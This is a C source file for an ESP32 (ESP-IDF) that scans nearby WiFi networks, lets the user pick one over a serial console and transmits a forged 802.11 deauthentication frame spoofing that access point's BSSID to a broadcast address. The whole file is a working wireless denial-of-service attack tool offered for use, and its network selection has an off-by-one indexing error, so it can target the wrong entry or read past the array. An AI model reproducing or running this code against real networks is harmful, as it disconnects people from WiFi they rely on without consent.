#include "main.h"
#include "esp_vfs_dev.h"
#include "driver/uart.h"
static const char *TAG = "wifi_deauth";

// Deauthorization frame
static const uint8_t deauth_frame_template[] = {
    0xC0, 0x00,                         
    0x00, 0x00,                         
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00,                         
    0x01, 0x00                          
};

void initialize_console(void) {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    uart_config_t uart_config = {
        .baud_rate = 115200,
        .data_bits = UART_DATA_8_BITS,
        .parity    = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE
    };
    ESP_ERROR_CHECK(uart_param_config(UART_NUM_0, &uart_config));
    ESP_ERROR_CHECK(uart_driver_install(UART_NUM_0, 256, 0, 0, NULL, 0));
    esp_vfs_dev_uart_use_driver(UART_NUM_0); 
}

esp_err_t wifi_init(void) {
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_t *sta_netif = esp_netif_create_default_wifi_sta();
    assert(sta_netif);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    ESP_ERROR_CHECK(esp_wifi_start());

    return ESP_OK;
}

wifi_ap_record_t* scan_wifi_networks(uint16_t* ap_count) {
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true
    };
    
    ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, true));
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(ap_count));
    
    wifi_ap_record_t* ap_records = malloc(sizeof(wifi_ap_record_t) * (*ap_count));
    if (!ap_records) {
        ESP_LOGE(TAG, "Failed to allocate memory for AP records");
        return NULL;
    }
    
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(ap_count, ap_records));
    return ap_records;
}

void print_networks(wifi_ap_record_t* ap_records, uint16_t ap_count) {
    printf("\nFound %d access points:\n", ap_count);
    
    for (int i = 0; i < ap_count; i++) {
        printf("%d. SSID: %s, RSSI: %d\n", i + 1, ap_records[i].ssid, ap_records[i].rssi);
    }
}

int get_user_selection(uint16_t max_networks) {
    char input[8];
    int selection = -1;
    bool valid_input = false;

    while (!valid_input) {
        printf("\nEnter network number (1-%d): ", max_networks);
        fflush(stdout);
    
        memset(input, 0, sizeof(input));
        
        if (fgets(input, sizeof(input), stdin) != NULL) {
            selection = atoi(input);
            if (selection >= 1 && selection <= max_networks) {
                valid_input = true;
            } else {
                printf("Invalid selection, try again\n");
            }
        }
    }
    return selection;
}

esp_err_t send_deauth_frame(const wifi_ap_record_t *ap_record) { // Renamed function
    uint8_t deauth_frame[sizeof(deauth_frame_template)];
    memcpy(deauth_frame, deauth_frame_template, sizeof(deauth_frame_template));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    };
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    
    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame_template), false);
    
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));
    return ret;
}

void wifi_deauth_control(void) {
    ESP_ERROR_CHECK(wifi_init());
    
    uint16_t ap_count = 0;
    wifi_ap_record_t* ap_records = scan_wifi_networks(&ap_count);
    
    if (!ap_records || ap_count == 0) {
        ESP_LOGE(TAG, "No networks found");
        free(ap_records);
        return;
    }

    print_networks(ap_records, ap_count);
    
    int selection = get_user_selection(ap_count);
    if (selection >= 0) {
        ESP_LOGI(TAG, "Selected network: %s", ap_records[selection].ssid);
        ESP_ERROR_CHECK(send_deauth_frame(&ap_records[selection])); // Renamed function
    } else {
        ESP_LOGE(TAG, "Invalid selection");
    }

    free(ap_records);
}

void app_main(void) {
    initialize_console();
    wifi_deauth_control();
}